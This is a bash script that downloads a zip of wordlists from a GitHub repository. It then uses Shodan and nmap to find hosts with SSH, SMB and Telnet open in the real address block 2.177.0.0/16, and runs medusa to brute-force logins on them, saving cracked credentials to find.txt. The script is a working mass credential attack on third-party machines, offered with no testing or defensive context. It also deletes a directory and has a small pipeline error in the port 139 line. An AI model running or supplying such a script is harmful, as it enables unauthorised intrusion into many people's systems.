#!/bin/bash 
cd ..
rm -r NEW 
mkdir NEW && cd NEW
sleep 1000 
wget https://github.com/pouriazareie/SSSSSSSS/raw/master/fin.zip
unzip fin.zip
base="2.177.0.0/16" ;shodan search --fields ip_str,port:22 ssh net:$base  | tee -a shodan22.txt  && sort shodan22.txt | awk '{$1=$1}1' | sed '/^$/d' >>  shodans22.txt &&  nmap -Pn -T5 --open -p 22 -iL "shodans22.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap22.txt"  && medusa -H "nmap22.txt" -U user1.txt -P ssh_passwd.txt -M ssh  -n 22 -O "find.txt" -T 32


shodan search --fields ip_str,port:445 smb net:$base  | tee -a shodan445.txt &&  sort shodan445.txt | awk '{$1=$1}1' | sed '/^$/d' >>  shodans445.txt &&  nmap -Pn -T5 --open -p 445 -iL "shodans445.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap445.txt"  && medusa -H "nmap445.txt" -U user1.txt -P p10.txt -M smbnt  -n 445 -O "find.txt" -T 32   

shodan search --fields ip_str,port:139 smb net:$base  | tee -a shodan139  sort shodan139.txt | awk '{$1=$1}1' | sed '/^$/d' >> shodans139.txt &&  nmap -Pn -T5 --open -p 139 -iL "shodans139.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap139.txt" &&   medusa -H "nmap139.txt" -U user1.txt  -P  p10.txt -M smbnt  -n 139 -O "find.txt" -T 32

shodan search --fields ip_str,port:23  net:$base  | tee -a  shodan23.txt &&  sort shodan23.txt | awk '{$1=$1}1' | sed '/^$/d' >>   shodans23.txt  &&  nmap -Pn -T5 --open -p 23 -iL "shodans23.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap23.txt" &&  medusa -H "nmap23.txt" -U user1.txt -P ssh_passwd.txt  -M telnet  -n  23 -O "find.txt" -T 32  